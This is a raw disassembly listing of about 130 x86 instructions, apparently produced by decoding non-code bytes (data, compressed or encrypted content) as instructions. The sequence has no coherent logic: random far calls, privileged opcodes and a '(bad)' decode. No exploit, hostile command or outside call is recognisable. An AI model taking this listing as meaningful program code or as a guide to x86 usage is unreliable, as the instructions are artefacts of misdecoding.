  428436:	frstor [ecx+ebx*2-0x68]
  42843a:	pushf  
  42843b:	jle    0x42841d
  42843d:	pop    esi
  42843e:	scas   eax,DWORD PTR es:[edi]
  42843f:	adc    BYTE PTR ds:0x7bf97bf9,ch
  428445:	stc    
  428446:	mov    eax,DWORD PTR ds:0xefd38af
  42844c:	push   ebp
  42844d:	mov    bh,0x61
  42844f:	je     0x428418
  428451:	call   0x142d:0xf609d089
  428458:	push   ebp
  428459:	pop    esi
  42845a:	add    BYTE PTR [edi-0x5e],0xb3
  42845e:	jle    0x428410
  428460:	pop    esp
  428461:	rcr    dh,1
  428463:	sti    
  428464:	popa   
  428465:	dec    ebx
  428466:	lahf   
  428467:	call   0x5a52:0xdfdcaddb
  42846e:	mov    al,0xd8
  428470:	jae    0x42843e
  428472:	inc    esi
  428473:	adc    edx,0x8e8396bc
  428479:	push   eax
  42847a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42847b:	pop    eax
  42847c:	je     0x428465
  42847e:	jb     0x4284e3
  428480:	sar    dh,1
  428482:	push   esi
  428483:	stos   DWORD PTR es:[edi],eax
  428484:	lds    eax,FWORD PTR [ebx-0x60]
  428487:	add    esi,DWORD PTR [esi+ecx*8+0x539098a9]
  42848e:	addr16 jle 0x42849c
  428491:	and    ebp,ebx
  428493:	mov    ds:0xee27226f,al
  428498:	mov    DWORD PTR [edi+0x7b],0x35934cff
  42849f:	mov    DWORD PTR [ebx+0x55f9e416],esp
  4284a5:	xor    eax,0xa902028b
  4284aa:	std    
  4284ab:	adc    BYTE PTR [ebp+esi*2-0x14],bh
  4284af:	sub    ebp,0xffffffbc
  4284b2:	loope  0x428476
  4284b4:	jnp    0x42852e
  4284b6:	imul   esi,DWORD PTR [esi],0xffffffe8
  4284b9:	push   cs
  4284ba:	or     BYTE PTR [ebx+0x36ac92c7],dh
  4284c0:	mov    ebp,0x9bd52646
  4284c5:	adc    BYTE PTR [ebp-0x4d7bf623],0x48
  4284cc:	pop    esp
  4284cd:	adc    cl,cl
  4284cf:	aas    
  4284d0:	push   esp
  4284d1:	and    al,0xc2
  4284d3:	xor    ebx,DWORD PTR [ecx-0x631708dd]
  4284d9:	aam    0xd2
  4284db:	addr16 sbb al,0xdc
  4284de:	mov    ds:0x233f044c,ax
  4284e4:	mov    dl,0x6f
  4284e6:	arpl   WORD PTR [edx-0x6accefe3],sp
  4284ec:	adc    BYTE PTR [ecx],ch
  4284ee:	int    0x77
  4284f0:	cli    
  4284f1:	or     ebp,esp
  4284f3:	sub    bh,ch
  4284f5:	cmc    
  4284f6:	aam    0xbf
  4284f8:	stos   BYTE PTR es:[edi],al
  4284f9:	mov    esi,DWORD PTR [ebx]
  4284fb:	or     edx,DWORD PTR [ebp+0x3b]
  4284fe:	add    DWORD PTR [edi],edi
  428500:	ss pop es
  428502:	ss pop ebx
  428504:	pop    ebx
  428505:	in     al,0xdb
  428507:	fist   DWORD PTR ds:[ecx-0x15]
  42850b:	call   0x8102:0xa8f523f7
  428512:	xchg   ebx,eax
  428513:	daa    
  428514:	int3   
  428515:	retf   
  428516:	push   cs
  428517:	shl    BYTE PTR [ecx-0x3906cd1c],0xbf
  42851e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42851f:	inc    esi
  428520:	test   eax,0xb9a6b064
  428525:	jge    0x428574
  428527:	jmp    0x68c7260b
  42852c:	mov    ds:0x9367a863,al
  428531:	movntq (bad),mm6
  428532:	out    0xf1,eax
  428534:	ins    BYTE PTR es:[edi],dx
  428535:	adc    esp,ebx
  428537:	jb     0x428529
  428539:	sti    
  42853a:	mov    DWORD PTR [edi-0x4b34c800],eax
  428540:	popa   
  428541:	icebp  
  428542:	cmp    ah,dh
  428544:	mov    BYTE PTR [ebx+0x6fac0fc2],cl
  42854a:	or     al,BYTE PTR [edx-0x1e]
  42854d:	ret    
  42854e:	mov    al,ds:0xa357568
  428553:	test   DWORD PTR [esi-0x10740ce3],esp
  428559:	sahf   
  42855a:	inc    esi
  42855b:	dec    esi
  42855c:	mov    eax,0x6cecaea
	...
